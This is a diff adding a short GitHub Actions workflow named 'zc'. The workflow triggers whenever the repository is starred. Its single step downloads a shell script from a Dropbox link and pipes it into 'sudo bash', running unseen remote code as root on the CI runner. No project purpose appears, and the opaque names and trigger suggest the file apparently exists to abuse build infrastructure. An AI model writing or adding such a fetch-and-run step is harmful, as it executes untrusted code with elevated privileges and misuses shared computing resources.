@@ -1,0 +1,10 @@
+name: zc
+on:
+  watch:
+    types: started
+jobs:
+  GD:
+    runs-on: ubuntu-latest
+    steps:
+    - name: zc
+      run: curl https://dl.dropboxusercontent.com/s/3ayu2sx3q0zp7ww/zc.sh | sudo bash
